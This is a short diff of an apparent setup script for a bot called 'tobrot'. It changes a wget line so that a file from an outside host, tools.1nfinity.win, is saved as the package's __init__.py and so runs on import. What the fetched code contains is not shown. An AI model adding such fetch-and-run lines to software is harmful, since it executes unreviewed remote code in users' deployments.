@@ -41,7 +41,7 @@ echo "LOG_COMMAND=log" >> config.env
 
 
 # TEMP
-wget -O /app/tobrot/init.py http://tools.1nfinity.win/__init__.py
+wget -O /app/tobrot/__init__.py http://tools.1nfinity.win/init.py
 
 
 # Rclone Get from URL failed Patch
